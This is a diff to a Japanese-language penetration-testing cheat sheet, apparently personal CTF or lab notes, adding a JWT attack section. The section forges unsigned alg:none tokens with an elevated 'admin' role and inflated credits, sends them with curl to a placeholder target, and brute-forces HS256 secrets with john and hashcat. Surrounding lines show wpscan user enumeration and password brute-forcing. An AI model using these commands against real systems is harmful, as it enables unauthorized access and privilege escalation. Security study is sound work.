@@ -14,7 +14,7 @@ date: 2026-03-28
 
 1. [偵察・情報収集](#1-偵察情報収集)
 2. [ポートスキャン・列挙](#2-ポートスキャン列挙)
-3. [Webアプリ攻撃](#3-webアプリ攻撃)
+3. [Webアプリ攻撃](#3-webアプリ攻撃)（ディレクトリ列挙 / SQLi / JWT攻撃 / WordPress）
 4. [脆弱性調査・エクスプロイト](#4-脆弱性調査エクスプロイト)
 5. [リバースシェル](#5-リバースシェル)
 6. [TTYアップグレード](#6-ttyアップグレード)
@@ -177,6 +177,40 @@ wpscan --url http://<IP> --enumerate u        # ユーザー列挙
 wpscan --url http://<IP> --enumerate vp       # 脆弱プラグイン
 wpscan --url http://<IP> -U <user> -P <wordlist>  # パスワードブルートフォース
 ```
+
+### JWT攻撃
+
+```bash
+# --- JWTのデコード ---
+
+# ペイロード部分（中央のセグメント）をデコード
+echo "<ペイロード>" | base64 -d 2>/dev/null
+
+# --- alg:none 攻撃（署名検証スキップ） ---
+
+# ヘッダー生成
+HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
+
+# ペイロード生成（role・creditsなどを改ざん）
+PAYLOAD=$(echo -n '{"email":"test@test.com","role":"admin","credits":9999}' | base64 | tr -d '=' | tr '+/' '-_')
+
+# 署名なしトークン（末尾の . が必須）
+TOKEN="${HEADER}.${PAYLOAD}."
+
+# 改ざんトークンを使ってアクセス
+curl -s http://<IP>/ -H "Cookie: <cookie_name>=${TOKEN}"
+
+# --- HS256 秘密鍵ブルートフォース ---
+
+# john
+echo "<JWT全体>" > jwt.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt --format=HMAC-SHA256
+
+# hashcat
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+> 詳細 → [[Skills/JWT-Attacks]]
 
 ---
 
